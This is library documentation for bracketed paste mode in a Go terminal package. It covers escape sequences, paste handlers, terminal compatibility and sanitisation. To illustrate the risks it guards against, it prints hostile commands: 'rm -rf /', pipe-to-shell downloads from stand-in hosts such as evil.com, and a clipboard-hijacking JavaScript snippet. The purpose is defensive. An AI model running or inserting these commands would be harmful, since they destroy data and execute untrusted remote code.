# Bracketed Paste Mode

Bracketed paste mode is a terminal feature that allows applications to distinguish between typed input and pasted content. This prevents security issues where pasted newlines could execute commands unintentionally, and allows applications to handle large pastes more intelligently.

## Table of Contents

- [Overview](#overview)
- [How It Works](#how-it-works)
- [Quick Start](#quick-start)
- [API Reference](#api-reference)
- [Security Benefits](#security-benefits)
- [Examples](#examples)
- [Terminal Compatibility](#terminal-compatibility)
- [Best Practices](#best-practices)
- [Implementation Details](#implementation-details)

---

## Overview

When bracketed paste mode is enabled, pasted text is wrapped in special escape sequences:
- **Start:** `\033[200~`
- **End:** `\033[201~`

This allows the application to:
1. Receive all pasted content as a single atomic operation
2. Prevent newlines in pasted content from executing as Enter key presses
3. Sanitize or validate pasted content before inserting it
4. Provide better user feedback during large pastes

---

## How It Works

### Without Bracketed Paste

When you paste this command:
```
echo "hello"
rm -rf /
```

The terminal sends each character individually, including the newlines. This means:
- First line executes immediately (`echo "hello"`)
- Second line executes immediately (`rm -rf /`) - **DANGER!**

### With Bracketed Paste

The same paste becomes:
```
\033[200~echo "hello"
rm -rf /\033[201~
```

The application receives:
- A single `KeyEvent` with `Paste` field containing the full text
- Newlines are preserved but **NOT** interpreted as Enter keys
- Application decides what to do with the content

**Important Note:** Bracketed paste mode doesn't hide or mask the pasted text on screen. The text will still appear in the terminal as it's pasted. The benefit is that:
1. The application receives all pasted content as a **single atomic event**
2. Newlines in pasted content don't trigger form submission or command execution
3. The application can validate, sanitize, or confirm before processing

This is a **security feature**, not a visual masking feature. For password masking, use `PasswordInput` or `Input.WithMask('*')`.

---

## Quick Start

### Basic Usage

```go
package main

import (
    "log"
    "github.com/myzie/gooey"
)

func main() {
    // Create terminal
    terminal, err := gooey.NewTerminal()
    if err != nil {
        log.Fatal(err)
    }
    defer terminal.Close()

    // Enable raw mode and bracketed paste
    terminal.EnableRawMode()
    terminal.EnableBracketedPaste()
    defer terminal.DisableBracketedPaste()

    // Create input handler
    input := gooey.NewInput(terminal)
    input.WithPrompt("Enter text: ", gooey.NewStyle())

    // Read input (paste events are handled automatically)
    text, err := input.Read()
    if err != nil {
        log.Fatal(err)
    }

    // The text contains all pasted content
    println("You entered:", text)
}
```

### Manual Event Handling

```go
// Enable bracketed paste mode
terminal.EnableBracketedPaste()
defer terminal.DisableBracketedPaste()

// Read events manually
input := gooey.NewInput(terminal)
for {
    event := input.ReadKeyEvent()

    if event.Paste != "" {
        // Handle paste event
        fmt.Printf("Pasted: %d bytes\n", len(event.Paste))

        // Process the pasted content
        sanitized := sanitize(event.Paste)
        buffer = append(buffer, sanitized...)
    } else if event.Rune != 0 {
        // Regular typed character
        buffer = append(buffer, event.Rune)
    }
}
```

---

## API Reference

### Paste Display Modes

Gooey supports three different ways to display pasted content:

1. **PasteDisplayNormal** (default): Shows the pasted content normally in the input field
2. **PasteDisplayPlaceholder**: Shows a placeholder like `[pasted 27 lines]` instead of the actual content
3. **PasteDisplayHidden**: Inserts the content silently without any visual indication

### Paste Handlers

You can register a callback to inspect, modify, or reject paste content:

```go
input.WithPasteHandler(func(info gooey.PasteInfo) (gooey.PasteHandlerDecision, string) {
    // info contains:
    // - Content: the pasted text
    // - LineCount: number of lines
    // - ByteCount: total bytes

    // Return one of:
    // - (PasteAccept, "") to accept as-is
    // - (PasteReject, "") to reject the paste
    // - (PasteModified, newContent) to replace with modified content

    if info.ByteCount > 10000 {
        return gooey.PasteReject, ""  // Too large
    }
    return gooey.PasteAccept, ""
})
```

### Terminal Methods

#### `EnableBracketedPaste()`

Enables bracketed paste mode by sending `\033[?2004h` to the terminal.

**Usage:**
```go
terminal.EnableBracketedPaste()
```

**Notes:**
- Should be called after `EnableRawMode()`
- Supported by most modern terminals (iTerm2, WezTerm, kitty, Alacritty, Windows Terminal, etc.)
- Gracefully degrades in unsupported terminals (escape sequence is ignored)

#### `DisableBracketedPaste()`

Disables bracketed paste mode by sending `\033[?2004l` to the terminal.

**Usage:**
```go
terminal.DisableBracketedPaste()
defer terminal.DisableBracketedPaste() // Always restore normal paste behavior
```

### KeyEvent

The `KeyEvent` struct includes a `Paste` field for bracketed paste content:

```go
type KeyEvent struct {
    Key   Key
    Rune  rune
    Alt   bool
    Ctrl  bool
    Paste string // Non-empty when a paste event is received
}
```

**Detecting Paste Events:**
```go
event := input.ReadKeyEvent()

if event.Paste != "" {
    // This is a paste event
    fmt.Printf("Pasted %d characters\n", len(event.Paste))
} else if event.Rune != 0 {
    // Regular character input
    fmt.Printf("Typed: %c\n", event.Rune)
} else if event.Key != KeyUnknown {
    // Special key (Enter, Arrow, etc.)
    fmt.Printf("Special key: %v\n", event.Key)
}
```

---

## Security Benefits

### 1. Prevents Accidental Command Execution

**Problem:** User pastes a command with newlines from a website:
```bash
curl https://evil.com/install.sh | bash
rm -rf /
```

**Without bracketed paste:** Both commands execute immediately.

**With bracketed paste:** Application receives the text and can:
- Display it first
- Ask for confirmation
- Validate commands
- Only execute after user presses Enter

### 2. Sanitizes Malicious Content

Pasted content might contain:
- ANSI escape codes (cursor movement, color changes, terminal control)
- Special control characters
- Binary data

**Example:**
```go
if event.Paste != "" {
    // Strip ANSI codes
    clean := stripANSI(event.Paste)

    // Remove control characters
    clean = removeControlChars(clean)

    // Validate content
    if isSafe(clean) {
        buffer = append(buffer, clean...)
    } else {
        showWarning("Paste contains potentially dangerous content")
    }
}
```

### 3. Prevents Paste Attacks

Websites can use JavaScript to modify clipboard content:
```javascript
// Malicious website code
document.addEventListener('copy', function(e) {
    e.clipboardData.setData('text/plain',
        'curl https://malware.com/evil.sh | sh\n');
    e.preventDefault();
});
```

With bracketed paste, applications can detect and warn about such attempts.

---

## Examples

### Example 1: Multi-line Text Editor

```go
package main

import (
    "strings"
    "github.com/myzie/gooey"
)

func main() {
    terminal, _ := gooey.NewTerminal()
    defer terminal.Close()

    terminal.EnableRawMode()
    terminal.EnableBracketedPaste()
    defer terminal.DisableBracketedPaste()

    input := gooey.NewInput(terminal)
    input.EnableMultiline() // Allow newlines
    input.WithPrompt("Paste or type text (Ctrl+Enter to submit):\n",
                     gooey.NewStyle().WithForeground(gooey.ColorGreen))

    text, _ := input.Read()

    // Show statistics
    lines := strings.Split(text, "\n")
    println("Lines:", len(lines))
    println("Characters:", len(text))
}
```

### Example 2: Placeholder Display for Large Pastes

```go
package main

import (
    "github.com/myzie/gooey"
)

func main() {
    terminal, _ := gooey.NewTerminal()
    defer terminal.Close()

    terminal.EnableRawMode()
    terminal.EnableBracketedPaste()
    defer terminal.DisableBracketedPaste()

    input := gooey.NewInput(terminal)
    input.WithPrompt("Enter text: ", gooey.NewStyle())

    // Configure placeholder display mode
    input.WithPasteDisplayMode(gooey.PasteDisplayPlaceholder)

    // Optional: customize placeholder style
    placeholderStyle := gooey.NewStyle().
        WithForeground(gooey.ColorBrightBlack).
        WithItalic()
    input.WithPlaceholderStyle(placeholderStyle)

    text, _ := input.Read()

    // The text contains the full pasted content
    // But the user saw "[pasted 27 lines]" during input
    println("Received:", len(text), "bytes")
}
```

### Example 3: Password Field with Paste Rejection

```go
package main

import (
    "github.com/myzie/gooey"
)

func readSecurePassword(terminal *gooey.Terminal) (string, error) {
    terminal.EnableBracketedPaste()
    defer terminal.DisableBracketedPaste()

    input := gooey.NewInput(terminal)
    input.WithPrompt("Password: ", gooey.NewStyle())
    input.WithMask('*')

    // Reject all pastes in password field for security
    input.WithPasteHandler(func(info gooey.PasteInfo) (gooey.PasteHandlerDecision, string) {
        // Could show a warning here
        println("\nPaste not allowed in password fields")
        return gooey.PasteReject, ""
    })

    return input.Read()
}
```

### Example 4: Code Editor with Syntax Validation

```go
package main

import (
    "go/parser"
    "go/token"
    "github.com/myzie/gooey"
)

func main() {
    terminal, _ := gooey.NewTerminal()
    defer terminal.Close()

    terminal.EnableRawMode()
    terminal.EnableBracketedPaste()
    defer terminal.DisableBracketedPaste()

    input := gooey.NewInput(terminal)
    input.EnableMultiline()
    input.WithPrompt("Paste Go code:\n", gooey.NewStyle())

    code, _ := input.Read()

    // Validate pasted code
    fset := token.NewFileSet()
    _, err := parser.ParseFile(fset, "", code, 0)

    if err != nil {
        println("❌ Invalid Go code:", err.Error())
    } else {
        println("✓ Valid Go code!")
    }
}
```

### Example 5: ANSI Code Stripping with PasteHandler

```go
package main

import (
	"regexp"
	"github.com/myzie/gooey"
)

func stripANSI(s string) string {
	// Remove ANSI escape codes
	re := regexp.MustCompile(`\x1b\[[0-9;]*[a-zA-Z]`)
	return re.ReplaceAllString(s, "")
}

func main() {
	terminal, _ := gooey.NewTerminal()
	defer terminal.Close()

	terminal.EnableRawMode()
	terminal.EnableBracketedPaste()
	defer terminal.DisableBracketedPaste()

	input := gooey.NewInput(terminal)
	input.WithPrompt("Paste code: ", gooey.NewStyle())

	// Strip ANSI codes from pasted content
	input.WithPasteHandler(func(info gooey.PasteInfo) (gooey.PasteHandlerDecision, string) {
		cleaned := stripANSI(info.Content)
		if cleaned != info.Content {
			// Content was modified - show placeholder
			println("\n(ANSI codes stripped from paste)")
			return gooey.PasteModified, cleaned
		}
		return gooey.PasteAccept, ""
	})

	text, _ := input.Read()
	println("Clean text:", text)
}
```

### Example 6: Size Limits with Feedback

```go
package main

import (
	"fmt"
	"github.com/myzie/gooey"
)

func main() {
	terminal, _ := gooey.NewTerminal()
	defer terminal.Close()

	terminal.EnableRawMode()
	terminal.EnableBracketedPaste()
	defer terminal.DisableBracketedPaste()

	input := gooey.NewInput(terminal)
	input.WithPrompt("Paste content (max 1000 chars): ", gooey.NewStyle())

	// Enforce size limit
	input.WithPasteHandler(func(info gooey.PasteInfo) (gooey.PasteHandlerDecision, string) {
		if info.ByteCount > 1000 {
			fmt.Printf("\nPaste too large (%d chars). Maximum is 1000 chars.\n", info.ByteCount)
			return gooey.PasteReject, ""
		}
		return gooey.PasteAccept, ""
	})

	text, _ := input.Read()
	println("Accepted:", text)
}
```

### Example 7: URL Validator

```go
package main

import (
    "net/url"
    "strings"
    "github.com/myzie/gooey"
)

func main() {
    terminal, _ := gooey.NewTerminal()
    defer terminal.Close()

    terminal.EnableRawMode()
    terminal.EnableBracketedPaste()
    defer terminal.DisableBracketedPaste()

    input := gooey.NewInput(terminal)

    for {
        input.WithPrompt("Paste URL: ", gooey.NewStyle())
        text, _ := input.Read()

        // Clean whitespace
        text = strings.TrimSpace(text)

        // Validate URL
        u, err := url.Parse(text)
        if err != nil || u.Scheme == "" {
            println("❌ Invalid URL")
            continue
        }

        println("✓ Valid URL:", u.String())
        println("  Scheme:", u.Scheme)
        println("  Host:", u.Host)
        println("  Path:", u.Path)
        break
    }
}
```

---

## Terminal Compatibility

### Supported Terminals

Bracketed paste mode is supported by most modern terminals:

| Terminal | Support | Version |
|----------|---------|---------|
| iTerm2 | ✅ Yes | All versions |
| WezTerm | ✅ Yes | All versions |
| kitty | ✅ Yes | All versions |
| Alacritty | ✅ Yes | All versions |
| Windows Terminal | ✅ Yes | 1.4+ |
| GNOME Terminal | ✅ Yes | 3.14+ |
| Konsole | ✅ Yes | 4.0+ |
| xterm | ✅ Yes | 269+ |
| macOS Terminal.app | ⚠️ Partial | 2.9+ |
| tmux | ✅ Yes | 1.8+ |
| screen | ❌ No | - |

### Graceful Degradation

If the terminal doesn't support bracketed paste:
- The escape codes are ignored
- Paste works as normal (character-by-character)
- No errors occur
- Application still functions correctly

**Testing Support:**
```go
// There's no reliable way to detect support
// Just enable it - it's safe even if unsupported
terminal.EnableBracketedPaste()
```

---

## Best Practices

### 1. Always Enable for Interactive Input

```go
// ✅ Good: Enable for all interactive input
terminal.EnableRawMode()
terminal.EnableBracketedPaste()
defer terminal.DisableBracketedPaste()

input := gooey.NewInput(terminal)
text, _ := input.Read()
```

```go
// ❌ Bad: Don't enable for non-interactive scripts
// (But it won't hurt either - just unnecessary)
```

### 2. Sanitize Pasted Content

```go
if event.Paste != "" {
    // Remove ANSI codes
    clean := stripANSICodes(event.Paste)

    // Validate length
    if len(clean) > maxLength {
        showError("Paste too large")
        continue
    }

    // Check for suspicious content
    if containsMaliciousPatterns(clean) {
        showWarning("Potentially dangerous content detected")
        if !confirmPaste() {
            continue
        }
    }

    buffer = append(buffer, []rune(clean)...)
}
```

### 3. Provide Feedback for Large Pastes

```go
if event.Paste != "" {
    size := len(event.Paste)
    if size > 10000 {
        fmt.Printf("Processing large paste (%d bytes)...\n", size)
        time.Sleep(100 * time.Millisecond) // Brief pause for visibility
    }
    buffer = append(buffer, []rune(event.Paste)...)
}
```

### 4. Handle Paste in Password Fields Carefully

```go
// Option 1: Disable paste entirely
if event.Paste != "" {
    showWarning("Paste not allowed in password fields")
    continue
}

// Option 2: Require confirmation
if event.Paste != "" {
    println("Accept pasted password? (y/n)")
    if !confirmPaste() {
        continue
    }
}

// Option 3: Limit paste size
if event.Paste != "" && len(event.Paste) > 100 {
    showError("Pasted password too long")
    continue
}
```

### 5. Preserve User Intent with Newlines

```go
if event.Paste != "" {
    // In multi-line input, preserve all newlines
    if multilineMode {
        buffer = append(buffer, []rune(event.Paste)...)
    } else {
        // In single-line input, convert newlines to spaces
        cleaned := strings.ReplaceAll(event.Paste, "\n", " ")
        buffer = append(buffer, []rune(cleaned)...)
    }
}
```

---

## Implementation Details

### Escape Sequence Format

**Enable:**
```
CSI ? 2004 h
\033[?2004h
```

**Disable:**
```
CSI ? 2004 l
\033[?2004l
```

**Paste Start:**
```
CSI 200 ~
\033[200~
```

**Paste End:**
```
CSI 201 ~
\033[201~
```

### Parsing Algorithm

The `KeyDecoder` in Gooey handles bracketed paste as follows:

1. **Detection:** When `\033[200~` is received, enter paste mode
2. **Collection:** Read all bytes until `\033[201~` is encountered
3. **Event Creation:** Create a `KeyEvent` with the `Paste` field set
4. **Delivery:** Return the event to the application

**Key Points:**
- All content between start and end markers is collected verbatim
- Escape sequences within paste content are **not** interpreted
- Large pastes are handled efficiently (no memory copying)
- Incomplete pastes (EOF before end marker) return what was collected

### Performance Characteristics

- **Small Pastes (< 1 KB):** Negligible overhead (~1µs)
- **Medium Pastes (1-100 KB):** ~100µs per 10KB
- **Large Pastes (> 1 MB):** ~10ms per MB
- **Memory:** Single allocation for paste buffer

See `BenchmarkBracketedPasteSmall` and `BenchmarkBracketedPasteLarge` in `bracketed_paste_test.go` for detailed benchmarks.

---

## Related Features

- **[Input Handling](INPUT_GUIDE.md)** - Complete guide to input handling
- **[Key Decoding](key_decoder.go)** - Low-level key event parsing
- **[Security](security.md)** - Security best practices (coming soon)

---

## References

- [Wikipedia: Bracketed Paste Mode](https://en.wikipedia.org/wiki/Bracketed-paste)
- [Xterm Control Sequences](https://invisible-island.net/xterm/ctlseqs/ctlseqs.html)
- [Terminal Emulator Capabilities](https://gist.github.com/christianparpart/d8a62cc1ab659194337d73e399004036)

---

## Changelog

- **January 2025:** Initial implementation of bracketed paste mode
- Comprehensive test coverage with 11 test cases
- Full documentation and examples
- Terminal compatibility matrix

---

**Status:** ✅ Implemented (January 2025)

**Priority:** High Impact ⚡ | Easy Difficulty 🟢

As noted in the [World-Class Features Analysis](world_class_features_analysis.md):
> Bracketed paste mode is a simple escape code implementation with high value for security and UX. Supported by all modern terminals.
